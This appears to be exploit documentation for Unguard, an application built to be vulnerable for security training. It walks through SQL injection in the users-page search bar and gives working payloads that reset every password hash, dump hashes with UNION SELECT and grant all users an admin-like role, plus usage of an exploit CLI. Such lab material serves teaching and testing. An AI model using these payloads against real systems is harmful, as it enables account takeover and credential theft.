# SQL Injection

Utilizing [SQL injection](https://owasp.org/www-community/attacks/SQL_Injection) can lead to sensitive data being read
and/or databases to be modified (Insert/Update/Delete).
In addition, administrative operations such as shutting down the DBMS can also be completed.

Unguard provides the functionality to search for users on the Users page, and as the search string is not checked before
being inserted into an SQL statement, it is possible to insert SQL commands which will then be run.

## Preconditions and Requirements

For this exploit to work you need:

* [unguard](../../../docs/DEV-GUIDE.md) deployed and running
* (optional) [unguard-exploit-toolkit](../../INSTALL.md) set up

## Exploitation

To inject an SQL command, you simply need to log into Unguard, go to the users page, and then include some
SQL statements in the searchbar which need to be properly prepared (see the next chapter "w/o Toolkit CLI").

### w/o Toolkit CLI

SQL injections are possible via the frontend. As mentioned before, you can use the search bar on the users page to execute SQL code.

An example for an SQL statement to run:

```sql
UPDATE users
SET password_hash='$2b$10$oYZ0GWhlnYQXgqtf2N24oeXE6JZ4WMNPt8yKCfaLpJAOqaKKyrjda'
WHERE 1 = 1;
```

This will set every user's password to 'password'.

To have this executed on the database, you need to modify the SQL command:
```
'; UPDATE users SET password_hash='$2b$10$oYZ0GWhlnYQXgqtf2N24oeXE6JZ4WMNPt8yKCfaLpJAOqaKKyrjda' WHERE 1 = 1; --
```

If you want to see the results of a SELECT operation, you can use the UNION keyword:
```
' UNION SELECT id+9999, username, password_hash FROM users; --
```

This will display the password hash beneath the username for each user.

The statements you can execute on the users page are somewhat limited. SELECT, INSERT and UPDATE all work, and so does SHUTDOWN, but REMOVE, TRUNCATE, and DDL statements do not. This appears to be a limitation of the Go MySQL driver, which seemingly requires that these statements be executed with the Go method `Exec` and not with `QueryRows`, the method used in the Go code.


### With Toolkit CLI

Using the `ug-exploit` tool, SQL statements can be injected.
Make sure to use `ug-exploit login` first, as you need to be logged in to post a bio.

Afterwards, use `ug-exploit sql-inject-mariadb` and type your desired command.
When using the CLI, you only need to specify the SQL statement to be injected. In this example,
your input would just need to be:

```sql
UPDATE users
SET password_hash='$2b$10$oYZ0GWhlnYQXgqtf2N24oeXE6JZ4WMNPt8yKCfaLpJAOqaKKyrjda'
WHERE 1 = 1;
```

A status code of 200 means that the statement was successfully executed, and 500 means that there was an error.

#### Examples

Giving everybody the AD_MANAGER role:
```sql
INSERT INTO users_roles (user_id, role_id) SELECT id AS user_id, (SELECT id FROM roles where name='AD_MANAGER') AS role_id FROM users WHERE id > 1;
```

## Further Details

* [SQL Injection - OWASP](https://owasp.org/www-community/attacks/SQL_Injection)
